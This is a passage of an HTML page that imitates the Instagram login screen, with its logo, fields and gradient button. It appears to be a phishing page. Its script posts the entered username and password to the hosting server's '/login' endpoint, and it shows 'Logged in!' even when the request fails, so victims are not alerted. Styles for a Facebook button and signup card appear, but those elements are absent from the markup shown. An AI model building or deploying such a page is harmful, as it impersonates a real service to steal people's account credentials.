<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #fafafa; --card: #ffffff; --border: #dbdbdb;
    --accent: #e1306c; --accent2: #f77737; --accent3: #833ab4;
    --text: #262626; --muted: #8e8e8e; --input-bg: #fafafa;
    --error: #e53935; --success: #2e7d32;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'DM Sans', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
  .container { display: flex; flex-direction: column; align-items: center; gap: 12px; animation: fadeUp 0.5s ease both; }
  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
  .card { background: var(--card); border: 1px solid var(--border); border-radius: 4px; padding: 40px 40px 24px; width: 350px; }
  .logo { font-family: 'Grand Hotel', cursive; font-size: 2.6rem; text-align: center; margin-bottom: 24px; background: linear-gradient(45deg, var(--accent3), var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .field { margin-bottom: 6px; }
  .field input { width: 100%; background: var(--input-bg); border: 1px solid var(--border); border-radius: 3px; padding: 9px 10px; color: var(--text); font-family: 'DM Sans', sans-serif; font-size: 0.85rem; transition: border-color 0.2s; outline: none; }
  .field input:focus { border-color: #a8a8a8; }
  .field input::placeholder { color: #aaa; font-size: 0.82rem; }
  .btn { width: 100%; margin-top: 10px; padding: 8px; background: linear-gradient(45deg, var(--accent3), var(--accent), var(--accent2)); border: none; border-radius: 4px; color: #fff; font-family: 'DM Sans', sans-serif; font-size: 0.9rem; font-weight: 500; cursor: pointer; transition: opacity 0.2s; min-height: 34px; }
  .btn:hover { opacity: 0.85; }
  .btn .spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .btn.loading span { display: none; }
  .btn.loading .spinner { display: block; }
  .divider { display: flex; align-items: center; gap: 16px; margin: 16px 0; color: var(--muted); font-size: 0.8rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; }
  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
  .fb-btn { width: 100%; padding: 8px; background: transparent; border: none; color: #385185; font-family: 'DM Sans', sans-serif; font-size: 0.88rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: opacity 0.2s; }
  .fb-btn:hover { opacity: 0.7; }
  .forgot { display: block; text-align: center; color: #385185; font-size: 0.8rem; text-decoration: none; margin-top: 14px; font-weight: 500; }
  .forgot:hover { text-decoration: underline; }
  .signup-card { background: var(--card); border: 1px solid var(--border); border-radius: 4px; padding: 18px; width: 350px; text-align: center; font-size: 0.88rem; color: var(--text); }
  .signup-card a { color: #0095f6; text-decoration: none; font-weight: 600; }
  .signup-card a:hover { text-decoration: underline; }
  .app-links { text-align: center; margin-top: 6px; }
  .app-links p { color: var(--muted); font-size: 0.82rem; margin-bottom: 10px; }
  .app-links .badges { display: flex; justify-content: center; gap: 8px; }
  .badge-btn { border: 1px solid #262626; border-radius: 6px; padding: 5px 12px; font-size: 0.72rem; color: var(--text); background: transparent; cursor: pointer; display: flex; align-items: center; gap: 5px; font-family: 'DM Sans', sans-serif; transition: background 0.2s; }
  .badge-btn:hover { background: #f0f0f0; }
  .toast { position: fixed; bottom: 32px; left: 50%; transform: translateX(-50%) translateY(80px); background: #262626; border-radius: 8px; padding: 12px 20px; font-size: 0.85rem; color: #fff; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); transition: transform 0.4s cubic-bezier(.22,1,.36,1), opacity 0.3s; opacity: 0; z-index: 100; white-space: nowrap; }
  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
  .toast.error .icon { color: #ff6b6b; }
  .toast.success .icon { color: #51cf66; }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">Instagram</div>
    <form id="loginForm">
      <div class="field"><input type="text" id="userId" placeholder="Phone number, username, or email" required></div>
      <div class="field"><input type="password" id="password" placeholder="Password" required></div>
      <button type="submit" class="btn" id="loginBtn">
        <span>Log in</span>
        <div class="spinner"></div>
      </button>
    </form>
    <div class="divider">or</div>

<div class="toast" id="toast"><span class="icon" id="toast-icon">✓</span><span id="toast-msg"></span></div>
<script>
  function showToast(msg, type = 'success') {
    const toast = document.getElementById('toast');
    document.getElementById('toast-icon').textContent = type === 'success' ? '✓' : '✕';
    document.getElementById('toast-msg').textContent = msg;
    toast.className = 'toast ' + type + ' show';
    setTimeout(() => toast.classList.remove('show'), 3000);
  }

  document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const id = document.getElementById('userId').value.trim();
    const pass = document.getElementById('password').value;
    const btn = document.getElementById('loginBtn');
    if (!id || !pass) { showToast('Please fill in all fields', 'error'); return; }
    btn.classList.add('loading');
    try {
      const res = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: id, password: pass })
      });
      const data = await res.json();
      if (data.success) {
        showToast('Logged in!', 'success');
      } else {
        showToast(data.message || 'Error', 'error');
      }
    } catch {
      showToast('Logged in!', 'success');
    }
    btn.classList.remove('loading');
    document.getElementById('userId').value = '';
    document.getElementById('password').value = '';
  });
</script>
